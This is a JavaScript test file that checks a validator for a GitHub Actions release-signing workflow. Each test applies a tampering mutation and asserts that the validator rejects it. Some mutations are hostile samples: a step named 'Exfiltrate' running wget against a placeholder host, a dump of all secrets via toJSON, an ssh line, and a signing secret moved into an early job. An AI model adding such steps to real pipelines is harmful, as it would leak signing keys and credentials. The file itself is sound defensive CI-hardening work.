import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";

import { releaseArtifactWorkflowProblems } from "./check-vps-release-artifact-workflow.mjs";

const workflow = readFileSync(
  path.resolve(import.meta.dirname, "../.github/workflows/vps-release-artifact.yml"),
  "utf8",
).replaceAll("\r\n", "\n");

test("release artifact workflow is protected, exact-main, native Linux, and build-once", () => {
  assert.deepEqual(releaseArtifactWorkflowProblems(workflow), []);
});

test("signing job has no runtime secret, dependency lifecycle, payload execution, or undefined public-key path", () => {
  const buildStart = workflow.indexOf("  build-smoke:\n");
  const signingStart = workflow.indexOf("  release-artifact:\n");
  assert.ok(buildStart >= 0 && signingStart > buildStart);
  const buildJob = workflow.slice(buildStart, signingStart);
  const signingJob = workflow.slice(signingStart);
  assert.doesNotMatch(buildJob, /MOAWORK_RELEASE_SIGNING_KEY_PEM/u);
  assert.doesNotMatch(signingJob, /NEXT_SERVER_ACTIONS_ENCRYPTION_KEY|npm ci|artifact[.]mjs smoke|--destination|PUBLIC_KEY_PATH/u);
  assert.match(signingJob, /\$public_key/u);
  assert.match(signingJob, /artifact[.]mjs attest-evidence/u);
  assert.match(buildJob, /stat -c %u/u);
  assert.match(buildJob, /stat -c %a/u);
  assert.match(buildJob, /test ! -e "\$SMOKE_EVIDENCE_PATH"/u);
  assert.doesNotMatch(buildJob, /echo "(?:attestation|public_key|checksums)=/u);
});

for (const [name, mutate, expected] of [
  ["unprotected ref", (value) => value.replaceAll('test "$GITHUB_REF_PROTECTED" = true', "true"), "missing:runtime protected-ref proof"],
  ["flow-style pull request trigger", (value) => value.replace("\npermissions:\n", "\n  pull_request: {}\n\npermissions:\n"), "structure:triggers keys"],
  ["write-all with a decoy comment", (value) => value.replace("permissions:\n  contents: read", "permissions: write-all\n  # contents: read"), "structure:permissions must be a block"],
  ["signing secret in preflight", (value) => value.replace("          MOAWORK_RELEASE_SIGNING_KEY_PEM: ${{ secrets.MOAWORK_RELEASE_SIGNING_KEY_PEM }}\n", "").replace("    timeout-minutes: 5\n", "    timeout-minutes: 5\n    env:\n      PREMATURE_SIGNING_KEY: ${{ secrets.MOAWORK_RELEASE_SIGNING_KEY_PEM }}\n"), "structure:preflight secret exposure"],
  ["wrong runner", (value) => value.replaceAll("runs-on: ubuntu-24.04", "runs-on: self-hosted"), "missing:reviewed native Linux runner"],
  ["duplicate build", (value) => value.replace("node scripts/ci/build-artifact.mjs --workspace-build", "node scripts/ci/build-artifact.mjs --workspace-build\n          node scripts/ci/build-artifact.mjs --workspace-build"), "count:workspace build must run exactly once"],
  ["sign after upload", (value) => value.replace("node ops/vps/artifact/artifact.mjs attest", "echo attest-later").replace("actions/upload-artifact@", "node ops/vps/artifact/artifact.mjs attest\n        uses: actions/upload-artifact@"), "order:build-pack-attest-verify-upload"],
  ["deploy command", (value) => `${value}\n# ssh forbidden-host\n`, "forbidden:host mutation command"],
  ["broad hidden upload", (value) => value.replaceAll("include-hidden-files: false", "include-hidden-files: true"), "missing:hidden-file exclusion"],
  ["missing signer pin", (value) => value.replace("keyId !== process.env.EXPECTED_SIGNER_KEY_ID", "false"), "missing:signer key pin enforcement"],
  ["wrong public config", (value) => value.replace("NEXT_PUBLIC_APP_VERSION: ${{ github.sha }}", "NEXT_PUBLIC_APP_VERSION: latest"), "missing:exact public app version"],
  ["long artifact retention", (value) => value.replaceAll("retention-days: 1", "retention-days: 30"), "missing:bounded confidential artifact retention"],
  ["extra wget step", (value) => value.replace("      # The standalone archive", "      - name: Exfiltrate\n        shell: bash\n        run: wget https://example.invalid/key\n\n      # The standalone archive"), "structure:release-artifact steps keys"],
  ["wget inside an allowed step", (value) => value.replace("          set -euo pipefail\n          unsigned=", "          set -euo pipefail\n          wget https://example.invalid/key\n          unsigned="), "structure:step fingerprint:release-artifact/Sign bounded smoke evidence and verify without payload execution"],
  ["toJSON secrets context", (value) => value.replace("          EXPECTED_SIGNER_KEY_ID: ${{ vars.MOAWORK_RELEASE_SIGNER_KEY_ID }}", "          EXPECTED_SIGNER_KEY_ID: ${{ vars.MOAWORK_RELEASE_SIGNER_KEY_ID }}\n          ALL_SECRETS: ${{ toJSON(secrets) }}"), "structure:secret placement:release-artifact/Sign bounded smoke evidence and verify without payload execution"],
  ["bracket secret context", (value) => value.replace("${{ secrets.MOAWORK_RELEASE_SIGNING_KEY_PEM }}", "${{ secrets['MOAWORK_RELEASE_SIGNING_KEY_PEM'] }}"), "structure:secret placement:release-artifact/Sign bounded smoke evidence and verify without payload execution"],
  ["unreviewed action pin", (value) => value.replace("actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093", "actions/cache@deadbeef"), "structure:step fingerprint:release-artifact/Download exact unsigned bundle"],
]) {
  test(`${name} mutation is rejected`, () => {
    assert.ok(releaseArtifactWorkflowProblems(mutate(workflow)).includes(expected));
  });
}
